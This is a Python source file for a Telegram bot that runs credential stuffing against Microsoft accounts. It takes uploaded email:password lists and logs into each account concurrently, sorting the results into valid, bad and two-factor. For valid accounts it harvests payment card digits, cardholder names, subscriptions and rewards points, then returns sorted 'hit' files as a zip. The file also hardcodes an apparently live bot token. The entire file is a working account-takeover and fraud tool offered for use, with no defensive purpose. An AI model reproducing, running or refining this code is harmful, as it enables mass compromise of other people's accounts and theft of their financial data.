import asyncio
import aiohttp
import json
import logging
import os
import re
import time
import zipfile
import shutil
import uuid
from urllib.parse import urlparse, parse_qs, quote
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]
MAX_CONCURRENT = 10
TIMEOUT = 25
TEMP_DIR = "./temp"

# SFTAG Config
SFTAG_CLIENT_ID = "00000000402B5328"
SFTAG_URL = f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
ATK_CLIENT_ID = "000000000004773A"

UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

def parse_lr(text: str, left: str, right: str) -> str:
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""

# ============================================================
# AUTH & API CHAIN
# ============================================================
async def sftag_login(session, email, password):
    headers = {"User-Agent": UA_EDGE}
    try:
        async with session.get(SFTAG_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            body = await r.text()
            post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
            ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
            
            if not post_url or not ppft:
                return None

            payload = {
                'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 
                'passwd': password, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 
                'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'
            }
            
            async with session.post(post_url, data=payload, headers=headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
                loc = r2.headers.get("Location", "")
                if "access_token=" not in loc:
                    text = await r2.text()
                    if "account or password is incorrect" in text.lower() or r2.status == 401:
                        return "bad"
                    if "identity/confirm" in loc or "recover" in loc:
                        return "2fa"
                    return None
                    
                ms_token = parse_lr(loc, "access_token=", "&")
                cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
                cid = cid.value.upper() if cid else ""
                return {"ms_token": ms_token, "cid": cid}
    except Exception:
        return None

async def get_pifd_atk(session):
    url = f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
    try:
        async with session.get(url, headers={"User-Agent": UA_EDGE}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            loc = r.headers.get("Location", "")
            return parse_lr(loc, "access_token=", "&token_type")
    except: return ""

async def get_payment_data(session, atk):
    headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
    result = {"country": "Unknown", "holder": "N/A", "cards": [], "subs": [], "balance": "", "points": "0"}

    # 1. Payment Instruments (Holder & Country)
    try:
        url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                items = []
                if isinstance(data, list):
                    items = data
                    for item in items:
                        if 'country' in item: result['country'] = item['country'].upper()
                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
                        if 'lastFourDigits' in item:
                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
                elif isinstance(data, dict):
                    result['country'] = data.get('country', 'Unknown').upper()
                    items = data.get('items', data.get('paymentInstruments', []))
                    for item in items:
                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
                        if 'lastFourDigits' in item:
                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
    except: pass

    # 2. Subscriptions & Transactions
    try:
        url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                for sub in data.get("subscriptions", []):
                    title = sub.get("title", "Unknown Sub")
                    next_date = sub.get("nextRenewalDate", "")
                    next_date = next_date.split("T")[0] if next_date else "N/A"
                    
                    amt = sub.get("totalAmount", "")
                    curr = sub.get("currency", "")
                    price = f"{amt} {curr}" if amt and curr else ""
                    
                    # Format: Title | Next Billing: Date | Price: Amount
                    sub_str = f"{title}"
                    if next_date != "N/A": sub_str += f" | Next Billing: {next_date}"
                    if price: sub_str += f" | Price: {price}"
                    
                    result["subs"].append(sub_str)
    except: pass

    # 3. Rewards Points
    try:
        url3 = "https://rewards.bing.com/"
        async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                text = await r.text()
                m = re.search(r'"availablePoints":(\d+)', text)
                if m: result["points"] = m.group(1)
    except: pass

    return result

# ============================================================
# MASTER CHECKER
# ============================================================
async def check_account(session, email, password):
    res = {"email": email, "pw": password, "status": "bad", "data": None}
    
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
        login_res = await sftag_login(sftag_session, email, password)
        if login_res == "bad": return res
        if login_res == "2fa":
            res["status"] = "2fa"
            return res
        if not login_res: return res
            
        res["status"] = "valid"
        atk = await get_pifd_atk(sftag_session)
        if atk:
            res["data"] = await get_payment_data(sftag_session, atk)
            
    return res

# ============================================================
# PROCESSING
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results = []
    done, total, t_start, last_edit = 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            async with sem: 
                r = await check_account(session, email, password)
            results.append(r)
            done += 1
            now = time.time()
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "valid")
                bad = sum(1 for x in results if x["status"] == "bad")
                tfa = sum(1 for x in results if x["status"] == "2fa")
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>", parse_mode=ParseMode.HTML)
                except: pass
        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    valid = [r for r in results if r["status"] == "valid"]
    bad = [r for r in results if r["status"] == "bad"]
    tfa = [r for r in results if r["status"] == "2fa"]
    
    ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    rich_valid = []
    for r in valid:
        if not r["data"]: continue
        d = r["data"]
        
        card_str = ", ".join(d["cards"]) if d["cards"] else "None"
        sub_str = ", ".join(d["subs"]) if d["subs"] else "None"
        
        line = f"{r['email']}:{r['pw']} | Region: {d['country']} | Holder: {d['holder']} | Points: {d['points']} | Cards: [{card_str}] | Subs: [{sub_str}]"
        rich_valid.append(line)

    write_file("valid_rich.txt", rich_valid)
    write_file("valid.txt", [f"{r['email']}:{r['pw']}" for r in valid])
    write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
    write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
    
    gp = []
    cc = []
    for r in valid:
        if not r["data"]: continue
        d = r["data"]
        if any("pass" in s.lower() for s in d["subs"]):
            gp.append(f"{r['email']}:{r['pw']} | {', '.join(d['subs'])}")
        if d["cards"]:
            cc.append(f"{r['email']}:{r['pw']} | {', '.join(d['cards'])}")
            
    if gp: write_file("gamepass.txt", gp)
    if cc: write_file("cards.txt", cc)

    write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}"])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nvalid: <b>{len(valid)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(valid)}_valid.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

# ============================================================
# TELEGRAM HANDLERS
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
    await msg.answer("<b>checker</b>\n\nsend a .txt file with <code>email:password</code>")

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
    
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e: return await status.edit_text(f"download failed: {e}")
    
    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p: combos.append((e, p))
    os.remove(local)
    
    if not combos: return await status.edit_text("no valid combos found.")
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
    await process_combos(combos, msg.chat.id, status, bot)

# ============================================================
# WEB SERVER FOR RENDER
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
